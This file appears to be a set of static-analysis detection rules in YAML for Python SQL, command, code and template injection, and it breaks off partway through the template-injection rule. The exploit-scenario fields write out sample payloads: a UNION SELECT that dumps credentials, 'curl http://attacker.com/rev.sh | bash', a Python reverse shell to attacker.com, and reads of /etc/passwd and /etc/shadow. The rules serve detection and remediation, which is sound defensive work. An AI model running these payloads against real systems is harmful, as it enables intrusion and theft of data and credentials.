rules:
- rule_id: PY-INJ-001
  title: SQL Injection via String Formatting
  description: 'Detects SQL query construction using Python f-strings, .format(), or % string formatting with user-controlled
    input.

    '
  language: python
  category: injection
  severity: Critical
  confidence: 0.93
  cwe: CWE-89
  owasp: A03:2021-Injection
  tags:
  - sql-injection
  - f-string
  - string-format
  patterns:
  - type: regex
    pattern: (?:cursor|conn|connection|db|engine|session)\.(?:execute|executemany|raw)\s*\(\s*f['"](?:SELECT|INSERT|UPDATE|DELETE|DROP|TRUNCATE)\b
  - type: regex
    pattern: (?:cursor|conn|connection|db)\.execute\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*["']\s*%\s*(?:\(|[a-z_])
  - type: regex
    pattern: (?:cursor|conn|connection|db)\.execute\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*\{\w*\}[^'"]*["']\.format\s*\(
  - type: regex
    pattern: text\s*\(\s*f['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*\{[^}]*(?:request|param|input|user|arg|data)\b
  - type: regex
    pattern: \.(?:execute|raw)\s*\(\s*f['"][^'"]{0,200}\bWHERE\b[^'"]{0,200}\{(?:request\.|param|input|user|arg|data)\b
  - type: regex
    pattern: \.(?:execute|raw)\s*\(\s*['"][^'"]{0,200}\bWHERE\b[^'"]{0,200}["']\s*\+\s*(?:request\.|param|input|user|arg|data)\b
    description: Detects SQL injection via string concatenation with + operator in WHERE clauses
  - type: regex
    pattern: (?:RawSQL|extra)\s*\(\s*f['"](?:SELECT|INSERT|UPDATE|DELETE|WHERE)\b[^'"]*\{[^}]*(?:request|param|input|user|arg|data)\b
    description: Detects Django RawSQL or extra() with f-string user input
  - type: regex
    pattern: pd\.read_sql(?:_query|_table)?\s*\(\s*f['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*\{[^}]*(?:request|param|input|user|arg|data)\b
    description: Detects pandas read_sql with f-string interpolation of user input
  anti_patterns:
  - execute(.*,.*(
  - execute(.*,.*[
  - '%(s)s'
  - :param
  - bindparam
  - text(.*).bindparams
  - sanitize
  - User.objects.filter(
  - User.objects.get(
  - User.objects.exclude(
  - .objects.values(
  - session.query(
  - db.session.query(
  - select([
  - Table.select()
  - Column(
  - sqlalchemy.orm.Query
  - flask_sqlalchemy
  - cursor.execute(query, params)
  - cursor.execute(sql, values)
  - asyncpg.connect
  - prepared_statement
  impact: 'Full SQL injection enabling data exfiltration, authentication bypass,

    data manipulation, and potential remote code execution through database

    features like INTO OUTFILE or xp_cmdshell.

    '
  remediation: "Use parameterized queries exclusively:\n\nDjango ORM (preferred):\n  User.objects.filter(username=user_input)\n\
    \  User.objects.raw(\"SELECT * FROM auth_user WHERE id = %s\", [user_id])\n\nDjango QuerySet.extra() - avoid, use annotations\
    \ instead:\n  MyModel.objects.annotate(val=Value(user_input)).filter(...)\n\nSQLAlchemy Core:\n  stmt = text(\"SELECT\
    \ * FROM users WHERE id = :id\")\n  result = connection.execute(stmt, {\"id\": user_id})\n\nSQLAlchemy ORM:\n  session.query(User).filter(User.id\
    \ == user_id).first()\n\nFlask-SQLAlchemy:\n  User.query.filter_by(username=user_input).first()\n\nFastAPI with async\
    \ databases:\n  query = users.select().where(users.c.id == user_id)\n  await database.fetch_one(query)\n\npsycopg2:\n\
    \  cursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n\nasyncpg:\n  await conn.fetchrow(\"SELECT * FROM\
    \ users WHERE id = $1\", user_id)\n\nNever use f-strings, .format(), or % formatting in SQL statements.\nUse an ORM whenever\
    \ possible. If raw SQL is required, always use\nparameterized placeholders native to the database driver.\n"
  references:
  - https://owasp.org/Top10/A03_2021-Injection/
  - https://cwe.mitre.org/data/definitions/89.html
  context_awareness:
    surrounding_context_patterns:
    - import sqlite3
    - import psycopg2
    - import pymysql
    - import mysql.connector
    - from sqlalchemy import
    - from django.db import connection
    - import asyncpg
    - import aiomysql
    - import pandas as pd
    taint_source_indicators:
    - request.GET
    - request.POST
    - request.args
    - request.form
    - request.json
    - request.data
    - request.query_params
    - request.body
    - request.params
    - sys.argv
    - input()
    - os.environ
    taint_sink_indicators:
    - cursor.execute(
    - connection.execute(
    - session.execute(
    - engine.execute(
    - db.execute(
    - pd.read_sql(
    - .raw(
    - RawSQL(
    - .extra(where=
    sanitization_patterns:
    - parameterized query with %s placeholder
    - parameterized query with :named placeholder
    - parameterized query with ? placeholder
    - bleach.clean(
    - escape_string(
    - quote_identifier(
    - django.utils.encoding.force_str(
    - int(user_input)
    - uuid.UUID(user_input)
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A Django web application has a search endpoint that builds SQL queries using

      f-strings. The developer constructs: cursor.execute(f"SELECT * FROM products

      WHERE name LIKE ''%{request.GET[''q'']}%''"). An attacker submits the search query:

      '' UNION SELECT username, password, email, credit_card FROM users --

      This appended payload closes the original LIKE clause, performs a UNION-based

      injection to exfiltrate the entire users table including credentials and payment

      data, and comments out the trailing SQL. The attacker can further escalate by

      writing a webshell via SELECT ... INTO OUTFILE on MySQL or using COPY on

      PostgreSQL to read arbitrary server files.

      '
    example_payload: ''' UNION SELECT username, password, email, null FROM auth_user --'
    attacker_objective: Exfiltrate sensitive data from the database including user credentials, personal information, and
      payment details. Potentially escalate to remote code execution through database-native file operations.
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: hardened
    detection_complexity: contextual
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - PY-INJ-003
    - PY-INJ-004
    - PY-AUTH-001
  detection_layer: 1
- rule_id: PY-INJ-002
  title: Command Injection via os.system or subprocess with shell=True
  description: 'Detects use of os.system(), os.popen(), or subprocess with shell=True accepting user-controlled input.

    '
  language: python
  category: injection
  severity: Critical
  confidence: 0.94
  cwe: CWE-78
  owasp: A03:2021-Injection
  tags:
  - command-injection
  - os-command
  - subprocess
  - rce
  patterns:
  - type: regex
    pattern: os\.(?:system|popen|popen2|popen3|popen4)\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user|arg|data)\b
  - type: regex
    pattern: os\.(?:system|popen)\s*\(\s*['"][^'"]*["']\s*(?:\+|%)\s*(?:request|param|input|user|arg|data)
  - type: regex
    pattern: subprocess\.(?:call|run|Popen|check_output|check_call|getoutput|getstatusoutput)\s*\([^)]*shell\s*=\s*True[^)]*(?:request|param|input|user|arg|data)
  - type: regex
    pattern: subprocess\.(?:call|run|Popen)\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user)\b[^)]*shell\s*=\s*True
  - type: regex
    pattern: os\.(?:system|popen)\s*\(\s*(?:request\.|param|input|user|cmd|command)\b
  - type: regex
    pattern: os\.(?:execl|execle|execlp|execlpe|execv|execve|execvp|execvpe)\s*\([^)]*(?:request|param|input|user|data)\b
    description: Detects os.exec* family functions with user-controlled arguments
  - type: regex
    pattern: commands\.(?:getoutput|getstatusoutput)\s*\([^)]*(?:request|param|input|user|data)\b
    description: Detects deprecated commands module with user input
  - type: regex
    pattern: asyncio\.create_subprocess_shell\s*\([^)]*(?:request|param|input|user|data)\b
    description: Detects asyncio shell subprocess with user-controlled input
  anti_patterns:
  - shlex.quote
  - shlex.split
  - shell=False
  - pipes.quote
  - '# nosec'
  - subprocess.run([
  - subprocess.call([
  - subprocess.Popen([
  - subprocess.check_output([
  - subprocess.check_call([
  - ALLOWED_COMMANDS
  - COMMAND_WHITELIST
  - COMMAND_ALLOWLIST
  - if command not in
  - if cmd in allowed
  - pathlib.Path(
  - shutil.copy(
  - shutil.move(
  - os.path.join(
  impact: 'Remote code execution. Attacker can execute arbitrary system commands on the

    server, potentially gaining full control, accessing sensitive files, or

    pivoting to internal systems.

    '
  remediation: "General best practices:\n  - Use subprocess.run() with shell=False (default) and pass args as a list\n  -\
    \ Use shlex.split() for safe argument parsing\n  - Use shlex.quote() for individual argument escaping if shell is needed\n\
    \  - Prefer Python libraries (shutil, pathlib) over shell commands\n  - Apply strict input validation with allowlists\n\
    \nDjango:\n  - Use django.core.management.call_command() for management commands\n  - Use pathlib or shutil for file operations\
    \ instead of shell commands\n  - Validate input against a strict allowlist before any subprocess usage\n\nFlask:\n  -\
    \ Use secure_filename() from werkzeug.utils for filename handling\n  - Avoid passing Flask request data to any subprocess\
    \ or os.system call\n  - Implement a command builder pattern with strict allowlists\n\nFastAPI:\n  - Use Pydantic models\
    \ to validate and constrain input before system calls\n  - Use asyncio.create_subprocess_exec (NOT _shell) with list arguments\n\
    \  - Implement typed enums for any command-selection logic\n\nSecure library recommendations:\n  - shlex: For safe shell\
    \ argument handling\n  - pathlib: For filesystem operations instead of shell commands\n  - shutil: For file copy/move/delete\
    \ instead of shell commands\n  - plumbum: For type-safe subprocess management\n"
  references:
  - https://cwe.mitre.org/data/definitions/78.html
  - https://docs.python.org/3/library/subprocess.html#security-considerations
  context_awareness:
    surrounding_context_patterns:
    - import os
    - import subprocess
    - import commands
    - import asyncio
    - from os import system
    - from subprocess import
    - import shlex
    - import shutil
    taint_source_indicators:
    - request.GET
    - request.POST
    - request.args
    - request.form
    - request.json
    - request.data
    - request.query_params
    - sys.argv
    - input()
    - os.environ
    - request.files
    - request.headers
    taint_sink_indicators:
    - os.system(
    - os.popen(
    - subprocess.call(
    - subprocess.run(
    - subprocess.Popen(
    - subprocess.check_output(
    - subprocess.check_call(
    - os.execv(
    - os.execvp(
    - asyncio.create_subprocess_shell(
    sanitization_patterns:
    - shlex.quote(
    - shlex.split(
    - pipes.quote(
    - re.match(r'^[a-zA-Z0-9_]+$'
    - if command in ALLOWED_COMMANDS
    - if cmd in whitelist
    - subprocess.run([cmd_path], ...
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * shell_flag_weight
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A Flask application provides a network diagnostic tool that lets users ping a

      host. The endpoint handler contains: os.system(f"ping -c 4 {request.form[''host'']}").

      An attacker submits the host value: 8.8.8.8; cat /etc/passwd

      The semicolon terminates the ping command and the shell executes cat /etc/passwd,

      disclosing the system user list. The attacker then escalates by injecting:

      8.8.8.8; curl http://attacker.com/shell.sh | bash

      This downloads and executes a reverse shell script, granting the attacker

      persistent interactive access to the server. From there, the attacker can

      exfiltrate secrets, install a cryptominer, or pivot into the internal network.

      '
    example_payload: 8.8.8.8; cat /etc/passwd && curl http://attacker.com/rev.sh | bash
    attacker_objective: Achieve remote code execution on the application server. Execute arbitrary commands to exfiltrate
      data, install backdoors, or pivot to internal network resources.
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: hardened
    detection_complexity: contextual
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - PY-INJ-003
    - PY-INJ-001
    - PY-SEC-002
  detection_layer: 1
- rule_id: PY-INJ-003
  title: Code Injection via eval/exec with User Input
  description: 'Detects use of eval(), exec(), or compile() with user-controlled input, enabling arbitrary Python code execution.

    '
  language: python
  category: injection
  severity: Critical
  confidence: 0.96
  cwe: CWE-94
  owasp: A03:2021-Injection
  tags:
  - code-injection
  - eval
  - exec
  - rce
  patterns:
  - type: regex
    pattern: \beval\s*\(\s*(?:request\.|param|input|user|data|arg|form|body)\b
  - type: regex
    pattern: \bexec\s*\(\s*(?:request\.|param|input|user|data|arg|form|body)\b
  - type: regex
    pattern: \bcompile\s*\(\s*(?:request\.|param|input|user|data|arg|form|body)\b
  - type: regex
    pattern: \beval\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user|data)\b
  - type: regex
    pattern: \b(?:eval|exec)\s*\(\s*['"][^'"]*["']\s*(?:\+|%)\s*(?:request|param|input|user|data)
  - type: regex
    pattern: \b__import__\s*\(\s*(?:request\.|param|input|user|data|arg|form|body)\b
    description: Detects dynamic import with user-controlled module name
  - type: regex
    pattern: \bgetattr\s*\(\s*\w+\s*,\s*(?:request\.|param|input|user|data|arg|form)\b
    description: Detects getattr with user-controlled attribute name for attribute injection
  - type: regex
    pattern: \bglobals\s*\(\s*\)\s*\[\s*(?:request\.|param|input|user|data|arg|form)\b
    description: Detects globals() access with user-controlled key
  anti_patterns:
  - ast.literal_eval
  - json.loads
  - '# safe'
  - literal_eval
  - RestrictedPython
  - simpleeval
  - numexpr.evaluate
  - safe_eval
  - ALLOWED_FUNCTIONS
  - SAFE_BUILTINS
  - compile(source, '<string>', 'eval')
  - json.dumps
  - yaml.safe_load
  - int(
  - float(
  - isinstance(user_input, (int, float))
  - math_parser
  - pyparsing
  impact: 'Arbitrary Python code execution in the application context. Attackers can

    import modules, access the file system, read environment variables, establish

    reverse shells, or pivot laterally.

    '
  remediation: "General:\n  - Never use eval()/exec() with user input under any circumstances\n  - Use ast.literal_eval()\
    \ for safe literal evaluation of strings, numbers, tuples, lists, dicts, booleans, and None\n  - Use json.loads() for\
    \ JSON parsing\n  - Implement a safe expression parser (e.g., pyparsing, simpleeval) for math expressions\n\nDjango:\n\
    \  - Use Django template language for dynamic rendering instead of eval\n  - Use Django forms and model validation for\
    \ input processing\n  - For dynamic filtering, use Q objects: Q(**{field: value})\n  - Never pass user input to eval for\
    \ dynamic queryset construction\n\nFlask:\n  - Use Flask-WTF forms for input validation\n  - For calculator-type features,\
    \ use simpleeval or numexpr libraries\n  - Use Jinja2 filters and template logic instead of eval for dynamic output\n\n\
    FastAPI:\n  - Use Pydantic validators to parse and constrain input types\n  - For dynamic computation, define allowed\
    \ operations as a mapping of string keys to functions\n  - Use dependency injection to safely resolve dynamic behavior\n\
    \nIf code execution is truly required:\n  - Use RestrictedPython with a minimal set of allowed builtins\n  - Run user\
    \ code in a sandboxed container (Docker, gVisor)\n  - Use WebAssembly-based sandboxes (Pyodide) for client-side execution\n\
    \  - Enforce execution time limits and memory constraints\n\nSecure library recommendations:\n  - ast.literal_eval: For\
    \ safely evaluating literal Python expressions\n  - simpleeval: For safe mathematical expression evaluation\n  - numexpr:\
    \ For safe numerical expression evaluation\n  - RestrictedPython: For sandboxed Python execution\n  - pyparsing: For building\
    \ safe custom parsers\n"
  references:
  - https://cwe.mitre.org/data/definitions/94.html
  - https://owasp.org/Top10/A03_2021-Injection/
  context_awareness:
    surrounding_context_patterns:
    - import ast
    - import json
    - import pickle
    - import marshal
    - from RestrictedPython import
    - import builtins
    - import importlib
    - __builtins__
    taint_source_indicators:
    - request.GET
    - request.POST
    - request.args
    - request.form
    - request.json
    - request.data
    - request.query_params
    - request.body
    - sys.argv
    - input()
    - os.environ
    - websocket.receive()
    taint_sink_indicators:
    - eval(
    - exec(
    - compile(
    - __import__(
    - getattr(
    - globals()[
    - locals()[
    - setattr(
    - importlib.import_module(
    sanitization_patterns:
    - ast.literal_eval(
    - json.loads(
    - int(
    - float(
    - bool(
    - isinstance(input_val, allowed_types)
    - re.fullmatch(r'^[0-9+\-*/() ]+$'
    - simpleeval.simple_eval(
    - numexpr.evaluate(
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * direct_eval_weight
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A Flask web application provides a calculator feature that evaluates user

      expressions using eval(). The endpoint handler contains:

      result = eval(request.form[''expression'']). An attacker submits the expression:

      __import__(''os'').system(''id && cat /etc/shadow'')

      This imports the os module and executes system commands, disclosing system user

      credentials. The attacker then escalates by sending:

      __import__(''os'').system(''python3 -c "import socket,subprocess;s=socket.socket();s.connect((\"attacker.com\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"'')

      This establishes a reverse shell to the attacker''s server with full interactive

      access. The attacker can then read Django settings containing SECRET_KEY and

      database credentials, dump the database, or install persistent backdoors.

      '
    example_payload: __import__('os').popen('cat /etc/passwd').read()
    attacker_objective: Execute arbitrary Python code in the application's runtime context. Import system modules to read
      files, access environment secrets, establish reverse shells, and gain persistent server access.
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: hardened
    detection_complexity: simple
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - PY-INJ-001
    - PY-INJ-002
    - PY-INJ-004
  detection_layer: 1
- rule_id: PY-INJ-004
  title: Server-Side Template Injection (SSTI)
  description: 'Detects Jinja2, Mako, or Django template rendering with user-controlled template strings, enabling server-side
    template injection.

    '
  language: python
  category: injection
  severity: High
  confidence: 0.9
  cwe: CWE-1336
  owasp: A03:2021-Injection
  tags:
  - ssti
  - template-injection
  - jinja2
  - rce
  patterns:
  - type: regex
    pattern: (?:Template|Environment)\s*\([^)]*\)\.(?:render|from_string)\s*\(\s*(?:request\.|param|input|user|data)
  - type: regex
    pattern: render_template_string\s*\(\s*(?:request\.|param|input|user|data|arg|form)
  - type: regex
    pattern: Template\s*\(\s*(?:request\.|param|input|user|data|arg|form)\b
  - type: regex
    pattern: from_string\s*\(\s*(?:request\.|param|input|user|data|f['"])
  - type: regex
    pattern: Jinja2Templates[^)]*\)\.TemplateResponse\s*\([^)]*(?:request\.query|request\.body|request\.form)
  - type: regex
    pattern: MakoTemplate\s*\(\s*(?:request\.|param|input|user|data|arg|form)\b
    description: Detects Mako template engine with user-controlled template string
  - type: regex
    pattern: render_template_string\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user|data)\b
    description: Detects render_template_string with f-string interpolation of user input
  - type: regex
    pattern: django\.template\.Template\s*\(\s*(?:request\.|param|input|user|data|arg|form)\b
    description: Detects Django Template class instantiated with user-controlled string
  anti_patterns:
  - render_template(
  - autoescape=True
  - SandboxedEnvironment
  - escape(
  - Markup(
  - render_to_string(
  - loader.get_template(
  - get_template(
  - template_name
  - TemplateView
  - render(request, 'template.html'
  - Jinja2Templates(directory=
  - Environment(loader=FileSystemLoader
  - Environment(loader=PackageLoader
  - bleach.clean(
  - markupsafe.escape(
  - django.utils.html.escape(
  - strip_tags(
  impact: 'Server-side template injection allows attackers to execute arbitrary code

    within the template engine context. In Jinja2, this can lead to full RCE

    via __class__.__mro__ traversal or os module access.

    '
  remediation: "General:\n  - Use render_template() with file-based templates, never render_template_string()\n  - If dynamic\
    \ templates are needed, use Jinja2 SandboxedEnvironment\n  - Enable autoescape=True\n  - Never pass user input as a template\
    \ string\n  - Validate and sanitize all dynamic template content\n\nDjango:\n  - Always use file-based templates with\
    \ render(request, 'template.html', context)\n  - Use Django's built-in template engine with autoescape enabled (default)\n\
    \  - Never instantiate django.template.Template() with user input\n  - Use the mark_safe() function only on trusted content,\
    \ never on user input\n  - Use django.utils.html.escape() for any user content rendered in templates\n\nFlask:\n  - Use\
    \ render_template('template.html', **context) with file-based templates\n  - Never use render_template_string() with user-controlled\
    \ content\n  - Enable Jinja2 autoescape (enabled by default for .html templates)\n  - Use markupsafe.escape() for user\
    \ input that must be rendered\n  - If dynamic templates are required, use jinja2.sandbox.SandboxedEnvironment\n\nFastAPI:\n\
    \  - Use Jinja2Templates(directory=\"templates\") with file-based templates\n  - Pass user data only as template context\
    \ variables, never as template source\n  - Enable autoescape=True in the Jinja2 environment configuration\n  - Use Pydantic\
    \ validation on all user inputs before passing to templates\n\nMako:\n  - Use file-based templates with TemplateLookup\n\
    \  - Enable strict_undefined=True and default_filters=['h']\n  - Never pass user input to mako.template.Template() constructor\n\
    \nSecure library recommendations:\n  - jinja2.sandbox.SandboxedEnvironment: For restricted Jinja2 execution\n  - markupsafe:\
    \ For safe HTML string handling\n  - bleach: For HTML sanitization\n"
  references:
  - https://portswigger.net/research/server-side-template-injection
  - https://cwe.mitre.org/data/definitions/1336.html
  context_awareness:
    surrounding_context_patterns:
    - from jinja2 import
    - from flask import render_template_string
